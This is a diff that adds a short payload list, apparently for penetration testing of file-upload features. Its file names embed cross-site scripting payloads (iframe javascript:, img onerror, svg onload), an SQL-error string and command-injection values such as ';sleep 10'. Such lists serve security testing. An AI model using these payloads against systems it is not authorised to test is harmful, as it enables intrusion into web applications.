@@ -1,0 +1,21 @@
+File upload
+========
+
+
+<font color="red">ERROR 1064 (42000); you have an error in your SQL syntax.jpg
+
+<iframe src="javascript:alert(0)">.jpg
+
+"><img src=x onerror=alert(0)>.jpg
+
+"><img src=x onerror=alert(0)>.png
+
+"><img src=x onerror=alert(0)>.pdf
+
+"><img src=x onerror=alert(0)>.txt
+
+<svg onload=alert(0).jpg
+
+;sleep 10:.jpg
+
+sleep (10):.jpg
